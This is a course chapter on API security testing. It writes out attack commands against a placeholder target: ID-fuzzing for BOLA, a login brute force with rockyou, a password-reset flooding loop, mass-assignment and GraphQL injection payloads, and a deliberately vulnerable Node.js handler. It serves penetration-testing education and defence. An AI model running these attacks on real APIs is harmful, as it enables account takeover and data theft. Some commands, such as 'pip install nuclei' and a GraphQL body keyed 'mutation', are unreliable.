---
title: "API Security Testing"
subtitle: "REST and GraphQL attack techniques, broken authentication, mass assignment, rate limiting bypass, BOLA/BFLA, and automated API scanning."
chapter: 23
level: "intermediate"
readingTime: "12 min"
topics: ["API security", "REST API", "GraphQL", "BOLA", "BFLA", "mass assignment", "JWT", "API testing", "OWASP API Top 10"]
---

<script>
	import Callout from '$lib/components/content/Callout.svelte';
</script>

<Callout type="info">

**Real-World Analogy**

APIs are the back doors that power every mobile app, SPA, and integration. They're often built fast, tested for functionality but not security, and exposed directly to the internet — making them the richest attack surface in modern applications.

</Callout>

## OWASP API Security Top 10

```
API1  BOLA (Broken Object Level Authorization) → access other users' objects
API2  Broken Authentication                    → weak tokens, no rate limiting on auth
API3  Broken Object Property Level Auth        → mass assignment, excessive data exposure
API4  Unrestricted Resource Consumption        → no rate limiting, no pagination limits
API5  BFLA (Broken Function Level Auth)        → regular user can call admin functions
API6  Unrestricted Access to Sensitive Biz Flows → automated abuse of business logic
API7  Server Side Request Forgery              → SSRF through API parameters
API8  Security Misconfiguration               → CORS, verbose errors, exposed docs
API9  Improper Inventory Management           → shadow APIs, deprecated versions
API10 Unsafe Consumption of APIs              → trusting third-party API responses
```

## API Discovery

```bash
# Find API endpoints — most important first step
# Check JavaScript files for API calls
curl -s https://target.com/app.js | grep -oP '["'"'"'][/]?api[/][^"'"'"']+' | sort -u

# Swagger/OpenAPI documentation (often exposed!)
curl https://target.com/swagger.json
curl https://target.com/openapi.json
curl https://target.com/api/docs
curl https://target.com/api/swagger
curl https://target.com/api-docs
curl https://target.com/v1/swagger

# Postman collections left in GitHub
# GitHub search: "target.com" "postman_collection"

# Kiterunner — API endpoint brute forcer with real API knowledge
kr scan https://target.com -w routes-large.kite
kr scan https://target.com -A=apiroutes-210228 --fail-status-codes 400,401,404,403

# ffuf with API wordlists
ffuf -u https://target.com/api/FUZZ -w api-endpoints.txt -mc 200,201,204,301,302,401,403
```

## BOLA (Broken Object Level Authorization)

The most common API vulnerability. Also called IDOR in APIs.

```bash
# Find your own resource ID
GET /api/v1/accounts/12345
# Response: {id: 12345, email: "attacker@example.com", balance: 100}

# Access another user's resource
GET /api/v1/accounts/12344
GET /api/v1/accounts/1

# Fuzzing with Burp Intruder or ffuf
ffuf -u "https://api.target.com/v1/accounts/FUZZ" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -w <(seq 1 10000) \
  -mc 200 -ac

# Look for UUIDs — harder but still possible
# Collect all UUIDs visible in the app (comments, shared items, notifications)
# Try them in other users' API calls

# Account enumeration via BOLA
# /api/users/1 → admin account details (if not checking ownership)
```

## Broken Authentication

```bash
# Test JWT vulnerabilities (see Chapter 11 for full detail)
# alg:none bypass
# Weak secret cracking
# RS256 → HS256 confusion

# Test for no rate limiting on login
ffuf -u https://api.target.com/auth/login \
  -X POST -H "Content-Type: application/json" \
  -d '{"email":"admin@target.com","password":"FUZZ"}' \
  -w /usr/share/wordlists/rockyou.txt \
  -mc 200

# Test password reset endpoint for no rate limiting
for i in $(seq 1 100); do
  curl -s -X POST https://api.target.com/auth/reset \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@target.com"}' &
done
# Should rate limit — if doesn't, finding!

# Token predictability — are session tokens sequential or predictable?
# Capture 10 tokens, analyze entropy
```

## Mass Assignment

APIs that auto-bind request body to database models:

```bash
# Vulnerable code (Node.js):
app.post('/api/users', (req, res) => {
  User.create(req.body)  // maps ALL body fields directly to DB
})

# Normal request:
POST /api/users
{"name": "Alice", "email": "alice@example.com"}

# Attack — add admin:true to body
POST /api/users
{"name": "Alice", "email": "alice@example.com", "role": "admin", "isAdmin": true}

# Update endpoint
PUT /api/v1/users/profile
{"name": "Alice", "email": "alice@example.com", "credit": 99999, "role": "admin"}

# Find hidden fields:
# GET the object first — what fields does it return?
# Try sending those fields (role, isAdmin, premium, verified, balance)
# Also try: GET /api/users/1 vs PUT /api/users/1 — update only shows subset?
```

## GraphQL Security

```bash
# Introspection — discover all types, queries, mutations
# (often enabled in dev/staging, sometimes prod)
curl -X POST https://api.target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name } } } }"}'

# Check for introspection (should be disabled in prod)
# If enabled → full schema reveals all queries, mutations, types

# InQL — Burp plugin for GraphQL testing
# Clairvoyance — extract schema even when introspection is disabled

# GraphQL injection
{"query": "{ user(id: \"1 OR 1=1\") { email password } }"}

# BOLA in GraphQL
{"query": "{ order(id: 999) { items total creditCard } }"}  # another user's order

# Batch query abuse (no rate limiting on individual queries)
{"query": "{ u1: user(id:1){email} u2: user(id:2){email} u3: user(id:3){email} ... }"}
# 1000 queries in one HTTP request → bypasses per-request rate limiting

# Alias enumeration
{"query": "{
  a1: login(email:\"admin@test.com\", password:\"password1\"){token}
  a2: login(email:\"admin@test.com\", password:\"password2\"){token}
  ...100 more aliases...
}"}

# Mutation testing
{"mutation": "{ updateUser(id: 2, role: \"admin\") { id role } }"}
```

## Automated API Testing

```bash
# Nuclei — fast template-based scanner
pip install nuclei
nuclei -u https://api.target.com -t nuclei-templates/http/api/

# OWASP ZAP — comprehensive API scanning
zap-cli start
zap-cli open-url https://api.target.com/openapi.json
zap-cli active-scan https://api.target.com
zap-cli report -o report.html -f html

# Restler — Microsoft's stateful REST API fuzzer
# Takes OpenAPI spec → fuzzes sequences of API calls
python3 restler.py compile --api_spec openapi.json
python3 restler.py fuzz --target_ip api.target.com --target_port 443

# Arjun — find hidden API parameters
python3 arjun.py -u https://api.target.com/v1/search
# Tests thousands of parameter names → finds hidden ones
```

## API Security Testing Checklist

```markdown
## Authentication
- [ ] No rate limiting on /auth/login → brute force
- [ ] No rate limiting on /auth/reset → email flooding
- [ ] JWT: test alg:none, weak secret, RS256→HS256
- [ ] API key in URL (logs, referrer leakage) vs header
- [ ] Token expiry checked server-side
- [ ] Refresh token rotation (old token invalidated)

## Authorization
- [ ] BOLA: change object ID to another user's
- [ ] BFLA: call admin endpoints as regular user
- [ ] Mass assignment: add role/admin/balance fields to updates
- [ ] Horizontal privilege: access resources of same-privilege user
- [ ] Vertical privilege: access resources of higher-privilege user

## Input Validation
- [ ] SQL injection in all string parameters
- [ ] NoSQL injection (MongoDB: $where, $ne, $gt)
- [ ] Command injection in all parameters
- [ ] SSRF in URL/webhook parameters

## Misc
- [ ] Introspection enabled (GraphQL)
- [ ] Verbose error messages revealing stack traces
- [ ] CORS: Access-Control-Allow-Origin: * with credentials
- [ ] Exposed Swagger/OpenAPI documentation
- [ ] Deprecated API versions accessible (/v1/ when /v3/ is current)
- [ ] No pagination limits (GET /users → returns all 500k users)
```

## Real Project: OWASP crAPI

crAPI (Completely Ridiculous API) — intentionally vulnerable API:

```bash
# Run locally with Docker
git clone https://github.com/OWASP/crAPI
docker-compose -f crAPI/deploy/docker/docker-compose.yml up

# Access at http://localhost:8888

# Challenges:
# 1. Find another user's vehicle location (BOLA)
# 2. Access another user's past orders (BOLA)
# 3. Reset another user's password (broken auth)
# 4. Change your account balance (mass assignment)
# 5. Get admin access via BFLA
# 6. Find the video service SSRF
# 7. Find leaked PII in the community forum
```

